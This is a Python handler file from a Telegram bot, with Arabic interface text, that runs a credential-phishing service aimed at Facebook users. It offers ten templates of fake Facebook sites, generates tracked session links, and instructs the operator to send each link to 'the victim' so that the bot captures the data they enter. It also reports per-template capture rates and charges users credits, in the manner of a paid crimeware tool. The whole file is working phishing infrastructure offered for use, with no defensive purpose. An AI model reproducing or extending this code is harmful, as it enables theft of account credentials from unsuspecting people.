# bot_handlers/callbacks/facebook.py
# ============================================================
# روابط مصيدة فيسبوك — مع تأكيد الأدوات
# ============================================================

import json

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import bot, redis_client, PUBLIC_URL
from imports_manager import can_use_tool, consume_usage
from logging_config import get_logger

from ..helpers import safe_edit, deny_message, h
from ..keyboards import build_facebook_sites_panel, main_menu
from ..templates import FACEBOOK_SITES
from ..sessions import create_fb_session

logger = get_logger("bot_handlers.callbacks.facebook")


def handle(call, chat_id, user_id, data):

    # ═══════════════════════════════════════════════════
    # 🎯 طلب فتح قسم الفيسبوك → عرض تأكيد
    # ═══════════════════════════════════════════════════
    if data == "gen_fb":
        bot.answer_callback_query(call.id)

        try:
            from points_system import (
                build_tool_confirm_text,
                build_tool_confirm_keyboard,
            )
            text, can_proceed = build_tool_confirm_text(user_id, "fb_site")
            m = build_tool_confirm_keyboard("fb_site", can_proceed)
            safe_edit(call, text, reply_markup=m)
            return
        except Exception as e:
            logger.exception(f"tool_confirm fb error: {e}")
            _show_fb_panel(call, chat_id, user_id)
            return

    # ═══════════════════════════════════════════════════
    # بعد التأكيد → تفتح اللوحة
    # ═══════════════════════════════════════════════════
    if data == "fb_show_panel":
        _show_fb_panel(call, chat_id, user_id)
        return

    if data.startswith("fb_site_"):
        _handle_site(call, chat_id, user_id, data)
        return

    if data.startswith("fb_stats_"):
        _handle_stats(call, chat_id, user_id, data)
        return


def _show_fb_panel(call, chat_id, user_id):
    """يعرض لوحة القوالب"""
    bot.answer_callback_query(call.id)
    safe_edit(
        call,
        "📘 <b>مواقع فيسبوك المزيفة</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>10 قوالب احترافية</b>\n"
        "كل قالب = موقع حقيقي بنسبة 95%\n\n"
        "💡 <i>اختر القالب المناسب للضحية</i>",
        reply_markup=build_facebook_sites_panel()
    )


def _handle_site(call, chat_id, user_id, data):
    template_key = data.replace("fb_site_", "")
    tpl = FACEBOOK_SITES.get(template_key)
    if not tpl:
        bot.answer_callback_query(call.id, "❌ القالب غير موجود", show_alert=True)
        return

    check = can_use_tool(user_id, "fb_site")
    if not check["allowed"]:
        bot.answer_callback_query(call.id, "❌ رصيدك غير كافي", show_alert=True)
        return

    bot.answer_callback_query(call.id, "🔄 جاري توليد الرابط...")
    consume_usage(user_id, "fb_site")

    session_id = create_fb_session(chat_id, template_key)
    if not session_id:
        safe_edit(call, "❌ فشل إنشاء الجلسة، حاول مرة أخرى",
                  reply_markup=build_facebook_sites_panel())
        return

    fake_link = f"{PUBLIC_URL}/fs/facebook/{template_key}?s={session_id}"

    text = (
        f"{tpl['emoji']} <b>{tpl['name']}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"📋 <b>وصف القالب:</b>\n"
        f"<i>{tpl['desc']}</i>\n\n"
        f"🎯 <b>الرابط الجاهز:</b>\n"
        f"<code>{fake_link}</code>\n\n"
        f"💡 <b>كيفية الاستخدام:</b>\n"
        f"• انسخ الرابط\n"
        f"• أرسله للضحية\n"
        f"• عندما تفتحه، ستظهر صفحة {tpl['name']}\n"
        f"• البوت سيستقبل البيانات فوراً"
    )

    m = InlineKeyboardMarkup()
    try:
        from telebot.types import CopyTextButton
        m.add(InlineKeyboardButton(
            "📋 نسخ الرابط",
            copy_text=CopyTextButton(text=fake_link)
        ))
    except Exception:
        pass

    m.row(
        InlineKeyboardButton("🔄 توليد جديد", callback_data=f"fb_site_{template_key}"),
        InlineKeyboardButton("📊 الإحصائيات", callback_data=f"fb_stats_{template_key}"),
    )
    m.add(InlineKeyboardButton("🔙 رجوع للقوالب", callback_data="fb_show_panel"))

    safe_edit(call, text, reply_markup=m)
    logger.info(f"FB Fake Link generated: {template_key}")


def _handle_stats(call, chat_id, user_id, data):
    template_key = data.replace("fb_stats_", "")
    bot.answer_callback_query(call.id, "📊 جاري الحساب...")

    try:
        session_ids = []
        if redis_client:
            session_ids = redis_client.lrange(f"se_user_sessions:{chat_id}", 0, 499) or []

        total = accessed = collected = 0
        for sid in session_ids:
            try:
                raw = redis_client.get(f"se_session:{sid}")
                if not raw:
                    continue
                sdata = json.loads(raw)
                if sdata.get('template') != template_key:
                    continue
                total += 1
                if sdata.get('accessed'):
                    accessed += 1
                if sdata.get('collected'):
                    collected += 1
            except Exception:
                continue

        tpl = FACEBOOK_SITES.get(template_key, {})
        rate = (collected / total * 100) if total > 0 else 0

        text = (
            f"📊 <b>إحصائيات {tpl.get('name', template_key)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"🔗 <b>إجمالي اللينكات:</b> <code>{total}</code>\n"
            f"👁️ <b>تم فتحها:</b> <code>{accessed}</code>\n"
            f"✅ <b>جمعت بيانات:</b> <code>{collected}</code>\n"
            f"📈 <b>نسبة النجاح:</b> <code>{rate:.1f}%</code>\n"
        )
    except Exception as e:
        logger.exception(f"fb_stats error: {e}")
        text = f"❌ خطأ: {h(str(e)[:200])}"

    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"fb_site_{template_key}"))
    safe_edit(call, text, reply_markup=m)
